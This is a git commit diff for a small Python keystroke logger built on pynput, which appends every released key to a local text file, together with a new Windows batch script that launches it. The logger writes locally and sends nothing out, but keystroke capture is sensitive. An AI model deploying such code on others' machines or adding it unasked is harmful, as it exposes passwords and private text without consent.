eaf0357392fbd1db18b623ebb2943becd266728b
Rince Mathew <rincemathewmanattu@gmail.com>
2023-03-13 14:03:42 +0530

    gitignore and batch script added

--- app.py
+++ app.py
@@ -3,7 +3,8 @@ import pynput.keyboard as keyboard
 
 def on_key_release(key):
     print('%s' % key)
-    file2write = open("C:\\Users\91949\Desktop\output.txt", 'a')
+    # file2write = open("C:\\Users\91949\Desktop\out-put.txt", 'a')
+    file2write = open("C:/Users/91949/Documents/Personal-folder/rince-mathew/output.txt", "a")
     file2write.write(', %s' % key )
     file2write.close()
 
---
+++ script.bat
@@ -0,0 +1,5 @@
+ECHO ON
+REM A batch script to execute a Python script
+@REM SET PATH=%PATH%;C:\Users\91949\Documents\Personal-folder\rince-mathew\
+C:\Users\91949\Documents\Personal-folder\rince-mathew\env\Scripts\activate && python C:\Users\91949\Documents\Personal-folder\rince-mathew\app.py
+PAUSE
